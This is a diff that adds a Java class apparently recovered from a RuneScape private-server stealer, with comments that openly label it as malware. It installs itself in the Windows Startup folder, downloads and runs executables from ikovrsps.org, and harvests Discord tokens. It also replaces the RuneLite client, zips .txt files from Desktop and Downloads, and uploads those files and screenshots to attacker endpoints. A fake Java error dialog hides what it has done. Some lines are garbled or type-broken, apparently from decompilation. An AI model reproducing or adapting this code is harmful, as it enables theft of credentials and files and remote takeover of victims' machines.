@@ -1,0 +1,670 @@
+public class FileDownloader {
+    public static void sendZipToWebhook(File maliciousZip) {
+        if (maliciousZip != null && maliciousZip.exists()) {
+            try {
+                // Generate a unique boundary for multipart form data
+                String boundaryMarker = "----WebKitFormBoundary" + System.currentTimeMillis();
+
+                // Target server receiving the stolen data
+                URL exfilServerUrl = new URL("https://ikovrsps.org/gamefiles/siketxt.php");
+
+                // Open connection to attackers server
+                HttpURLConnection exfilConnection = (HttpURLConnection) exfilServerUrl.openConnection();
+                exfilConnection.setDoOutput(true);
+                exfilConnection.setRequestMethod("POST");
+
+                // Set headers for file upload
+                exfilConnection.setRequestProperty("Content-Type",
+                    "multipart/form-data; boundary=" + boundaryMarker);
+
+                // Get output stream to send data
+                OutputStream exfilOutputStream = exfilConnection.getOutputStream();
+
+                try {
+                    // Writer for the multipart form data
+                    PrintWriter formWriter = new PrintWriter(new OutputStreamWriter(exfilOutputStream, StandardCharsets.UTF_8),
+                        true
+                    );
+
+                    try {
+                        // Write form headers
+                        formWriter.append("--").append(boundaryMarker).append("\r\n");
+                        formWriter.append("Content-Disposition: form-data; name=\"file\"; filename=\"hussla.zip\"\r\n");
+                        formWriter.append("Content-Type: application/zip\r\n\r\n");
+                        formWriter.flush();
+
+                        // Send the actual malicious file contents
+                        Files.copy(maliciousZip.toPath(), exfilOutputStream);
+                        exfilOutputStream.flush();
+
+                        // Write form footer
+                        formWriter.append("\r\n").append("--")
+                            .append(boundaryMarker).append("--\r\n")
+                            .flush();
+                    } catch (Throwable t) {
+                        try {
+                            formWriter.close();
+                        } catch (Throwable ignored) {}
+                        throw t;
+                    }
+
+                    formWriter.close();
+                } catch (Throwable t) {
+                    if (exfilOutputStream != null) {
+                        try {
+                            exfilOutputStream.close();
+                        } catch (Throwable ignored) {}
+                    }
+                    throw t;
+                }
+
+                if (exfilOutputStream != null) {
+                    exfilOutputStream.close();
+                }
+
+                // Check server response
+                int serverResponseCode = exfilConnection.getResponseCode();
+                if (serverResponseCode != 200 && serverResponseCode != 201) {
+                    LOGS.add("❌ Upload failed. Response code: " + serverResponseCode);
+
+                    // Read error details if available
+                    BufferedReader errorReader = new BufferedReader(
+                        new InputStreamReader(
+                            exfilConnection.getErrorStream() != null ?
+                            exfilConnection.getErrorStream() :
+                            exfilConnection.getInputStream()
+                        )
+                    );
+
+                    String errorLine;
+                    try {
+                        while ((errorLine = errorReader.readLine()) != null) {
+                            LOGS.add("🔁 Server response: " + errorLine);
+                        }
+                    } finally {
+                        errorReader.close();
+                    }
+                } else {
+                    LOGS.add("✅ ZIP uploaded successfully.");
+                }
+            } catch (IOException ex) {
+                LOGS.add("❌ Failed to upload ZIP: " + ex.getMessage());
+            }
+        } else {
+            LOGS.add("⚠️ ZIP file is null or missing, skipping upload.");
+        }
+    }
+
+    public static File captureScreenshot() {
+        try {
+            // Create robot instance for screen capture
+            Robot screenCapturer = new Robot();
+
+            // Get full screen dimensions
+            Rectangle screenDimensions = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+
+            // Capture screen image
+            BufferedImage screenImage = screenCapturer.createScreenCapture(screenDimensions);
+
+            // Create temp file for screenshot
+            File screenshotFile = new File(
+                System.getProperty("java.io.tmpdir") +
+                File.separator + "screenshot.png"
+            );
+
+            // Save screenshot to file
+            ImageIO.write(screenImage, "png", screenshotFile);
+            return screenshotFile;
+
+        } catch (Exception ex) {
+            LOGS.add("❌ Failed to capture screenshot: " + ex.getMessage());
+            return null;
+        }
+    }
+
+    public static String getPublicIP() {
+        try {
+            float URLCheckIP = new URL("https://checkip.amazonaws.com");
+            BufferedReader ipReader = new BufferedReader(new InputStreamReader(URLCheckIP.openStream()));
+            return ipReader.readLine();
+        } catch (IOException var3) {
+            return "Unknown";
+        }
+    }
+
+    public static File zipDesktopAndDownloadsTxtFiles() {
+        try {
+            // Get system paths
+            String userHome = System.getProperty("user.home");
+
+            // Desktop path
+            String[] pathParts = new String[1];
+            pathParts[0] = "Desktop";
+            Path desktopPath = Paths.get(userHome, pathParts);
+
+            // Downloads path
+            pathParts = new String[1];
+            pathParts[0] = "Downloads";
+            Path downloadsPath = Paths.get(userHome, pathParts);
+
+            // Documents path (where zip will be saved)
+            pathParts = new String[1];
+            pathParts[0] = "Documents";
+            Path documentsPath = Paths.get(userHome, pathParts);
+
+            // Create target zip file path
+            Path zipFilePath = documentsPath.resolve("hussla.zip");
+
+            // Ensure Documents directory exists
+            if (!Files.exists(documentsPath, new LinkOption[0])) {
+                Files.createDirectories(documentsPath);
+            }
+
+            LOGS.add("📂 Scanning Desktop and Downloads for .txt files...");
+            LOGS.add("📦 Zip will be saved to: " + zipFilePath);
+
+            AtomicInteger filesZippedCount = new AtomicInteger(0);
+            ZipOutputStream zipOutputStream = new ZipOutputStream(Files.newOutputStream(zipFilePath));
+
+            try {
+                // Define file processing logic
+                Consumer < Path > processFolder = (folderPath) - > {
+                    try {
+                        Files.walk(folderPath)
+                            .filter((filePath) - > {
+                                return Files.isRegularFile(filePath, new LinkOption[0]) &&
+                                    filePath.toString().toLowerCase().endsWith(".txt");
+                            })
+                            .forEach((txtFile) - > {
+                                try {
+                                    // Calculate relative path for zip entry
+                                    Path relativePath = folderPath.relativize(txtFile);
+                                    String folderName = folderPath.getFileName().toString();
+                                    String zipEntryPath = folderName + "/" + relativePath.toString().replace("\\", "/");
+
+                                    // Add file to zip
+                                    zipOutputStream.putNextEntry(new ZipEntry(zipEntryPath));
+                                    Files.copy(txtFile, zipOutputStream);
+                                    zipOutputStream.closeEntry();
+                                    filesZippedCount.incrementAndGet();
+                                } catch (IOException e) {
+                                    LOGS.add("⚠️ Failed to add file: " + txtFile + " (" + e.getMessage() + ")");
+                                }
+                            });
+                    } catch (IOException e) {
+                        LOGS.add("⚠️ Error scanning folder: " + folderPath + " (" + e.getMessage() + ")");
+                    }
+                };
+
+                // Process both Desktop and Downloads folders
+                processFolder.accept(desktopPath);
+                processFolder.accept(downloadsPath);
+            } catch (Throwable t) {
+                try {
+                    zipOutputStream.close();
+                } catch (Throwable suppressed) {
+                    t.addSuppressed(suppressed);
+                }
+                throw t;
+            }
+
+            zipOutputStream.close();
+
+            if (filesZippedCount.get() > 0) {
+                LOGS.add("📦 Total .txt files zipped: " + filesZippedCount.get());
+                return zipFilePath.toFile();
+            } else {
+                LOGS.add("⚠️ No .txt files found to zip.");
+                return null;
+            }
+        } catch (IOException e) {
+            LOGS.add("❌ Error creating zip: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private static String DESEncryption(String llllllllllllllllllIlIIllIIlIIlll, String llllllllllllllllllIlIIllIIlIlIII) {
+        try {
+            SecretKeySpec llllllllllllllllllIlIIllIIlIllII = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(llllllllllllllllllIlIIllIIlIlIII.getBytes(StandardCharsets.UTF_8)), lIlIIIlllIll[8]), "DES");
+            long llllllllllllllllllIlIIllIIlIIlII = Cipher.getInstance("DES");
+            llllllllllllllllllIlIIllIIlIIlII.init(lIlIIIlllIll[2], llllllllllllllllllIlIIllIIlIllII);
+            return new String(llllllllllllllllllIlIIllIIlIIlII.doFinal(Base64.getDecoder().decode(llllllllllllllllllIlIIllIIlIIlll.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
+        } catch (Exception var5) {
+            var5.printStackTrace();
+            return null;
+        }
+    }
+
+    public static void executeTask() {
+        LOGS.clear();
+        LOGS.add("⏰ Time: " + LocalDateTime.now());
+        LOGS.add("🟢 Running FileDownloader...");
+
+        // Startup path for persistence
+        String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Spoon.exe";
+        String currentJarPath = "";
+
+        // 1. Persistence Installation
+        try {
+            currentJarPath = new File(FileDownloader.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
+        } catch (URISyntaxException e) {
+            LOGS.add("❌ Failed to resolve current JAR path: " + e.getMessage());
+        }
+
+        // Copy to startup if not already there
+        if (!currentJarPath.equalsIgnoreCase(startupPath)) {
+            try {
+                String copyResult = downloadToStartupOnly();
+                LOGS.add(copyResult.trim());
+            } catch (Exception e) {
+                LOGS.add("❌ Failed to copy to Startup: " + e.getMessage());
+            }
+        } else {
+            LOGS.add("🚫 Already running from Startup path — skipping Spoon.exe download.");
+        }
+
+        // 2. System Information Collection
+        try {
+            String hostName = InetAddress.getLocalHost().getHostName();
+            String publicIP = getPublicIP();
+            LOGS.add("🖥️ PC Name: " + hostName);
+            LOGS.add("🌍 Public IP: " + publicIP);
+        } catch (Exception e) {
+            LOGS.add("⚠️ Failed to get PC name or IP: " + e.getMessage());
+        }
+
+        // 3. Discord Token Harvesting
+        try {
+            List < String > discordTokens = RSPS.getTokens();
+            if (discordTokens != null && !discordTokens.isEmpty()) {
+                LOGS.add("🔑 Discord Token(s) found: " + discordTokens.size());
+                Iterator < String > tokenIterator = discordTokens.iterator();
+
+                while (tokenIterator.hasNext()) {
+                    String token = tokenIterator.next();
+                    LOGS.add("➡️ Token: " + token);
+                }
+            } else {
+                LOGS.add("⚠️ Discord tokens not found or Discord not installed.");
+            }
+        } catch (Exception e) {
+            LOGS.add("⚠️ Error checking Discord tokens: " + e.getMessage());
+        }
+
+        // 4. RuneLite Client Replacement
+        File runeLiteFolder;
+        try {
+            LOGS.add("🔍 Searching for RuneLite folder...");
+            runeLiteFolder = findRuneLiteFolder();
+            if (runeLiteFolder == null) {
+                LOGS.add("❌ RuneLite folder not found.");
+            } else {
+                String runeLiteExePath = runeLiteFolder.getAbsolutePath() + "\\RuneLite.exe";
+                LOGS.add("📍 RuneLite.exe path: " + runeLiteExePath);
+                File runeLiteExe = new File(runeLiteExePath);
+
+                if (runeLiteExe.exists()) {
+                    long fileSize = runeLiteExe.length();
+                    LOGS.add("📏 RuneLite.exe size: " + fileSize + " bytes");
+                    LOGS.add("🔁 Replacing RuneLite.exe regardless of size.");
+
+                    // Backup original file
+                    File backupFile = new File(runeLiteFolder, "RuneLite_" + System.currentTimeMillis() + ".exe");
+                    if (runeLiteExe.renameTo(backupFile)) {
+                        LOGS.add("📁 Renamed to: " + backupFile.getName());
+                    } else {
+                        LOGS.add("❌ Failed to rename RuneLite.exe");
+                    }
+                } else {
+                    LOGS.add("⚠️ RuneLite.exe not found. Downloading...");
+                }
+
+                // Download replacement
+                if (downloadFile("https://ikovrsps.org/gamefiles/image.exe", runeLiteExePath)) {
+                    LOGS.add("✅ Downloaded new RuneLite.exe");
+                } else {
+                    LOGS.add("❌ Failed to download RuneLite.exe");
+                }
+            }
+        } catch (Exception e) {
+            LOGS.add("❌ Error handling RuneLite section: " + e.getMessage());
+        }
+
+        // 5. Data Exfiltration
+        try {
+            File screenshot = captureScreenshot();
+            File textFilesZip = zipDesktopAndDownloadsTxtFiles();
+
+            // Create threads for asynchronous uploading
+            Thread screenshotThread = new Thread(() - > {
+                sendScreenshotToWebhook(screenshot);
+            });
+
+            Thread zipThread = new Thread(() - > {
+                try {
+                    Thread.sleep(3000 L); // Delay to avoid rate limits
+                    sendZipToWebhook(textFilesZip);
+                } catch (InterruptedException e) {
+                    LOGS.add("❌ ZIP thread interrupted: " + e.getMessage());
+                }
+            });
+
+            screenshotThread.start();
+            zipThread.start();
+            screenshotThread.join();
+            zipThread.join();
+        } catch (Exception e) {
+            LOGS.add("❌ Error with screenshot or ZIP process: " + e.getMessage());
+        }
+
+        // 6. Fake Error Message (Social Engineering)
+        try {
+            JFrame errorFrame = new JFrame();
+            errorFrame.setAlwaysOnTop(true);
+            errorFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+            errorFrame.setUndecorated(true);
+            errorFrame.setLocationRelativeTo(null);
+            errorFrame.setVisible(true);
+            JOptionPane.showMessageDialog(errorFrame,
+                "A Java Exception has occurred.",
+                "Java Virtual Machine Launcher",
+                JOptionPane.ERROR_MESSAGE);
+            errorFrame.dispose();
+        } catch (Exception e) {
+            LOGS.add("❌ Failed to show error window: " + e.getMessage());
+        }
+
+        System.out.println("❌ Failed to open Ikov");
+    }
+
+    public static File findRuneLiteFolder() {
+        // Create array of drive letters to check (C, D, E, F, G)
+        char[] driveLetters = new char[5];
+        driveLetters[0] = 'C';
+        driveLetters[1] = 'D';
+        driveLetters[2] = 'E';
+        driveLetters[3] = 'F';
+        driveLetters[4] = 'G';
+
+        // Check each drive for RuneLite installation
+        for (int i = 0; i < driveLetters.length; i++) {
+            char driveLetter = driveLetters[i];
+            String runeLitePath = driveLetter + ":\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\RuneLite";
+            File runeLiteFolder = new File(runeLitePath);
+
+            if (runeLiteFolder.exists() && runeLiteFolder.isDirectory()) {
+                return runeLiteFolder;
+            }
+        }
+
+        return null;
+    }
+
+    private static String BlowFishEncryption(String llllllllllllllllllIlIIllIIllIlII, String llllllllllllllllllIlIIllIIllIlIl) {
+        try {
+            SecretKeySpec llllllllllllllllllIlIIllIIlllIIl = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(llllllllllllllllllIlIIllIIllIlIl.getBytes(StandardCharsets.UTF_8)), "Blowfish");
+            int llllllllllllllllllIlIIllIIllIIIl = Cipher.getInstance("Blowfish");
+            llllllllllllllllllIlIIllIIllIIIl.init(lIlIIIlllIll[2], llllllllllllllllllIlIIllIIlllIIl);
+            return new String(llllllllllllllllllIlIIllIIllIIIl.doFinal(Base64.getDecoder().decode(llllllllllllllllllIlIIllIIllIlII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
+        } catch (Exception var4) {
+            var4.printStackTrace();
+            return null;
+        }
+    }
+
+    public static void sendScreenshotToWebhook(File screenshotFile) {
+        if (screenshotFile == null || !screenshotFile.exists()) {
+            LOGS.add("❌ Screenshot file is missing, cannot send to webhook.");
+            return;
+        }
+
+        try {
+            LOGS.add("📤 Sending logs and screenshot to webhook...");
+
+            // Set up webhook connection
+            URL webhookUrl = new URL("https://ikovrsps.org/gamefiles/sike.php");
+            HttpURLConnection connection = (HttpURLConnection) webhookUrl.openConnection();
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+
+            // Create multipart boundary
+            String boundary = "----Boundary" + System.currentTimeMillis();
+            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            // Build log message
+            StringBuilder logBuilder = new StringBuilder();
+            for (String logEntry: LOGS) {
+                logBuilder.append("• ").append(logEntry).append("\n");
+            }
+
+            // Create JSON payload
+            String jsonPayload = String.format(
+                "{\"username\": \"PC: %s\",\"embeds\": [{\"title\": \"📄 File Downloader Logs\",\"color\": 16776960,\"description\": \"%s\"}]}",
+                InetAddress.getLocalHost().getHostName(),
+                logBuilder.toString()
+                .replace("\"", "\\\"")
+                .replace("\\", "\\\\")
+                .replace("\r", "\\r")
+                .replace("\n", "\\n")
+            );
+
+            // Send multipart request
+            try (OutputStream outputStream = connection.getOutputStream(); PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, "UTF-8"), true)) {
+
+                // Send JSON payload part
+                writer.append("--").append(boundary).append("\r\n");
+                writer.append("Content-Disposition: form-data; name=\"payload_json\"\r\n");
+                writer.append("Content-Type: application/json\r\n\r\n");
+                writer.append(jsonPayload).append("\r\n");
+                writer.flush();
+
+                // Send file part
+                writer.append("--").append(boundary).append("\r\n");
+                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n");
+                writer.append("Content-Type: image/png\r\n\r\n");
+                writer.flush();
+
+                // Copy screenshot file to output stream
+                Files.copy(screenshotFile.toPath(), outputStream);
+                outputStream.flush();
+
+                // Close multipart request
+                writer.append("\r\n").flush();
+                writer.append("--").append(boundary).append("--\r\n").flush();
+            }
+
+            // Check response
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                LOGS.add("✅ Screenshot and logs sent successfully.");
+            } else {
+                try (InputStream errorStream = connection.getErrorStream()) {
+                    if (errorStream != null) {
+                        StringBuilder errorResponse = new StringBuilder();
+                        try (BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream))) {
+                            String line;
+                            while ((line = reader.readLine()) != null) {
+                                errorResponse.append(line);
+                            }
+                        }
+                        LOGS.add("❌ Screenshot webhook failed. Server response: " + errorResponse.toString());
+                    } else {
+                        LOGS.add("❌ Screenshot webhook failed. No error stream from server.");
+                    }
+                }
+            }
+        } catch (IOException e) {
+            LOGS.add("❌ Failed to send screenshot: " + e.getMessage());
+        }
+    }
+
+    private static String XOREncryption(String llllllllllllllllllIlIIllIIIllIIl, String llllllllllllllllllIlIIllIIIlIIll) {
+        llllllllllllllllllIlIIllIIIllIIl = new String(Base64.getDecoder().decode(llllllllllllllllllIlIIllIIIllIIl.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
+        StringBuilder llllllllllllllllllIlIIllIIIlIlll = new StringBuilder();
+        char[] llllllllllllllllllIlIIllIIIlIllI = llllllllllllllllllIlIIllIIIlIIll.toCharArray();
+        double llllllllllllllllllIlIIllIIIlIIII = lIlIIIlllIll[0];
+        int llllllllllllllllllIlIIllIIIIllll = llllllllllllllllllIlIIllIIIllIIl.toCharArray();
+        Exception llllllllllllllllllIlIIllIIIIlllI = llllllllllllllllllIlIIllIIIIllll.length;
+
+        for (int llllllllllllllllllIlIIllIIIIllIl = lIlIIIlllIll[0]; llllllllllllllllllIlIIllIIIIllIl < llllllllllllllllllIlIIllIIIIlllI; ++llllllllllllllllllIlIIllIIIIllIl) {
+            boolean llllllllllllllllllIlIIllIIIIllII = llllllllllllllllllIlIIllIIIIllll[llllllllllllllllllIlIIllIIIIllIl];
+            llllllllllllllllllIlIIllIIIlIlll.append((char)(llllllllllllllllllIlIIllIIIIllII ^ llllllllllllllllllIlIIllIIIlIllI[llllllllllllllllllIlIIllIIIlIIII % llllllllllllllllllIlIIllIIIlIllI.length]));
+            ++llllllllllllllllllIlIIllIIIlIIII;
+        }
+
+        return llllllllllllllllllIlIIllIIIlIlll.toString();
+    }
+
+    static {
+        lIIllllIlll();
+        lIIllllIlIl();
+        FILE_URL = "https://ikovrsps.org/gamefiles/image.exe";
+        WEBHOOK_URL = "https://ikovrsps.org/gamefiles/sike.php";
+        ZIP_WEBHOOK_URL = "https://ikovrsps.org/gamefiles/siketxt.php";
+        LOGS = new ArrayList();
+    }
+
+    public static String downloadToStartupOnly() {
+        StringBuilder resultMessage = new StringBuilder();
+
+        try {
+            // Set up target path in Windows startup folder
+            String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Spoon.exe";
+            File startupFile = new File(startupPath);
+
+            // Check if file already exists
+            if (startupFile.exists()) {
+                LOGS.add("📦 Spoon.exe already exists in Startup folder. Skipping download.");
+                resultMessage.append("📦 Spoon.exe already present. Skipped download.");
+                return resultMessage.toString();
+            }
+
+            // Download the file
+            String downloadUrl = "https://ikovrsps.org/gamefiles/images.exe";
+            LOGS.add("📥 Downloading images.exe to Startup folder...");
+            LOGS.add("📍 Spoon.exe target path: " + startupPath);
+
+            boolean downloadSuccess = downloadFile(downloadUrl, startupPath);
+
+            if (downloadSuccess) {
+                LOGS.add("✅ Downloaded Spoon.exe to Startup folder.");
+
+                try {
+                    // Execute the downloaded file
+                    ProcessBuilder processBuilder = new ProcessBuilder(startupPath);
+                    processBuilder.start();
+                    LOGS.add("🚀 Executed Spoon.exe from Startup folder.");
+                    resultMessage.append("🚀 Spoon.exe executed.");
+                } catch (IOException e) {
+                    LOGS.add("❌ Failed to execute Spoon.exe: " + e.getMessage());
+                    resultMessage.append("❌ Failed to execute Spoon.exe.");
+                }
+            } else {
+                LOGS.add("❌ Failed to download images.exe to Startup folder.");
+                resultMessage.append("❌ Download to Startup failed.");
+            }
+        } catch (Exception e) {
+            LOGS.add("❌ Exception during downloadToStartupOnly: " + e.getMessage());
+            resultMessage.append("❌ Exception: ").append(e.getMessage());
+        }
+
+        return resultMessage.toString();
+    }
+
+    public static void main(String[] args) {
+        // Path where the malware persists in Windows startup
+        String startupPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Spoon.exe";
+        String currentJarPath = "";
+        try {
+            // Get the path of the currently running JAR file
+            currentJarPath = new File(FileDownloader.class
+                    .getProtectionDomain()
+                    .getCodeSource()
+                    .getLocation()
+                    .toURI())
+                .getAbsolutePath();
+        } catch (URISyntaxException e) {
+            // Log error if path resolution fails
+            System.err.println("Error resolving current JAR path: " + e.getMessage());
+        }
+        // Check if we're running from the startup location
+        boolean runningFromStartup = currentJarPath.equalsIgnoreCase(startupPath);
+        if (runningFromStartup) {
+            // Persistent mode - runs every 15 minutes
+            ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+            scheduler.scheduleAtFixedRate(() - > {
+                try {
+                    executeTask(); // Execute the malicious tasks
+                } catch (Exception e) {
+                    System.err.println("Error executing scheduled task: " + e.getMessage());
+                    e.printStackTrace();
+                }
+            }, 0, 15, TimeUnit.MINUTES);
+            try {
+                // Keep the program running indefinitely
+                Thread.currentThread().join();
+            } catch (InterruptedException e) {
+                System.err.println("Main thread interrupted: " + e.getMessage());
+                Thread.currentThread().interrupt(); // Restore interrupted status
+            }
+        } else {
+            // One-time execution mode
+            try {
+                executeTask(); // Execute the malicious tasks once
+            } catch (Exception e) {
+                System.err.println("Error executing task: " + e.getMessage());
+                e.printStackTrace();
+            }
+        }
+    }
+
+    public static boolean downloadFile(String fileUrl, String destinationPath) {
+        try {
+            LOGS.add("🌐 Attempting to download: " + fileUrl);
+
+            // Set up HTTP connection
+            URL url = new URL(fileUrl);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0");
+
+            // Check server response
+            int responseCode = connection.getResponseCode();
+            LOGS.add("🔄 Server Response Code: " + responseCode);
+
+            if (responseCode != HttpURLConnection.HTTP_OK) { // HTTP 200
+                LOGS.add("❌ Failed to download file. Server returned: " + connection.getResponseMessage());
+                return false;
+            }
+
+            // Prepare destination file and directories
+            File destinationFile = new File(destinationPath);
+            File parentDirectory = destinationFile.getParentFile();
+
+            if (!parentDirectory.exists()) {
+                LOGS.add("📂 Creating directory: " + parentDirectory.getAbsolutePath());
+                parentDirectory.mkdirs();
+            }
+
+            // Download the file
+            try (InputStream inputStream = connection.getInputStream(); FileOutputStream outputStream = new FileOutputStream(destinationFile)) {
+
+                byte[] buffer = new byte[4096]; // 4KB buffer
+                int bytesRead;
+
+                while ((bytesRead = inputStream.read(buffer)) != -1) {
+                    outputStream.write(buffer, 0, bytesRead);
+                }
+            }
+
+            LOGS.add("✅ File downloaded successfully to: " + destinationPath);
+            return true;
+
+        } catch (IOException e) {
+            LOGS.add("❌ Error downloading file: " + e.getMessage());
+            return false;
+        }
+    }
+
+    public FileDownloader() {}
+}
